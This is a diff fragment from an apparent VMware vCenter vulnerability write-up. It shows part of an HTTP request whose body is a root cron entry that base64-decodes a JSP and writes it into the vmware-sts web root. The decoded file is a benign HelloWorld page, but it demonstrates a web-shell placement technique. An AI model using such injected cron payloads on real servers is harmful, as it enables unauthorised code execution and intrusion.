@@ -201,7 +201,7 @@ Content-Type: application/json
 X-Deployment-Secret: abc
 Content-Length: 154
 
-* * * * * root echo PCUgICAgICAgIG91dC5wcmludGxuKCJIZWxsb1dvcmxkIik7ICAgICAgJT4=|base64 -d >/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/hello.jsp
+* * * * * root echo PCUgICAgICAgIG91dC5wcmludGxuKCJIZWxsb1dvcmxkIik7ICAgICAgJT4=|base64 -d >/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/hello.jsp
 ```
 
 ## DataAppAgentController
